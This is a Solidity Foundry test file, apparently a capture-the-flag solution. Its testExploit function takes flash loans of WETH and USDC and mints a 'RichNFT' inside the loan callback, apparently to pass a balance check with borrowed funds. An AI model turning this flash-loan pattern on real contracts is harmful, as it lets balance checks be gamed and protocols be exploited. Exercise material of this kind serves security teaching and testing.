// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {RichNFTBaseTest} from "./RichNFTBase.t.sol";

import "../../src/interface.sol";

interface IERC3156FlashBorrower {
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32);
}

interface IERC3156FlashLender {
    function flashLoan(
        IERC3156FlashBorrower receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool);
}

contract RichNFTTest is RichNFTBaseTest, IERC3156FlashBorrower {
    IERC3156FlashLender public flashLender;

    constructor(address _flashLender) {
        flashLender = IERC3156FlashLender(_flashLender);
    }

    function testExploit() public validation {
        bytes memory data = "";

        // Request flash loans for WETH and USDC
        flashLender.flashLoan(this, address(weth), 10000 * 1e18, data);
        flashLender.flashLoan(this, address(usdc), 10000 * 1e6, data);
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata
    ) external override returns (bytes32) {
        require(msg.sender == address(flashLender), "Untrusted lender");
        require(initiator == address(this), "Untrusted loan initiator");

        // Mint the RichNFT
        nft.mintRichNFT();

        // Repay the flash loan
        IERC20(token).approve(address(flashLender), amount + fee);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }
}